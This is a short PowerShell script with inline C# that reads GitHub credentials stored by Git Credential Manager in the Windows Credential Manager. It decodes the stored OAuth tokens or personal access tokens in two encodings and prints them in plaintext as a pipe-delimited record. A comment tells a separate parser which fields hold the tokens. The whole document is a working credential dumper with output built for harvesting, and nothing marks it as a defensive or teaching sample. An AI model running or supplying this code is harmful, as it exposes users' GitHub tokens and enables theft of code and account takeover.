$code = @'
using System;
using System.Runtime.InteropServices;
public class CredMan {
  [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
  public static extern bool CredRead(string target, int type, int flags, out IntPtr credPtr);
  [DllImport("advapi32.dll")]
  public static extern void CredFree(IntPtr cred);
  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
  public struct CREDENTIAL {
    public int Flags; public int Type; public string TargetName; public string Comment;
    public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
    public int CredentialBlobSize; public IntPtr CredentialBlob; public int Persist;
    public int AttributeCount; public IntPtr Attributes; public string TargetAlias; public string UserName;
  }
}
'@
Add-Type -TypeDefinition $code

# GCM stores two candidates: the api-scoped account entry (gho_ OAuth, may be expired)
# and the classic git:https PAT. Blob encoding differs per GCM version -> decode both ways.
$targets = @("GitHub - https://api.github.com/coderstory", "git:https://github.com")
foreach ($t in $targets) {
  $ptr = [IntPtr]::Zero
  if ([CredMan]::CredRead($t, 1, 0, [ref]$ptr)) {
    $cred = [Runtime.InteropServices.Marshal]::PtrToStructure($ptr, [type][CredMan+CREDENTIAL])
    if ($cred.CredentialBlobSize -gt 0 -and $cred.CredentialBlob -ne [IntPtr]::Zero) {
      $bytes = New-Object byte[] $cred.CredentialBlobSize
      [Runtime.InteropServices.Marshal]::Copy($cred.CredentialBlob, $bytes, 0, $cred.CredentialBlobSize)
      $u8 = [Text.Encoding]::UTF8.GetString($bytes).Trim([char]0)
      $u16 = [Text.Encoding]::Unicode.GetString($bytes).Trim([char]0)
      # NOTE parser side: token fields are segments 5 and 7 (target=1, tag "USER"=2, username=3, "UTF8"=4, tok=5, "UTF16"=6, tok=7)
      Write-Output ("CRED|" + $t + "|USER|" + $cred.UserName + "|UTF8|" + $u8 + "|UTF16|" + $u16)
    } else {
      Write-Output ("EMPTY|" + $t)
    }
    [CredMan]::CredFree($ptr) | Out-Null
  } else {
    Write-Output ("MISS|" + $t)
  }
}
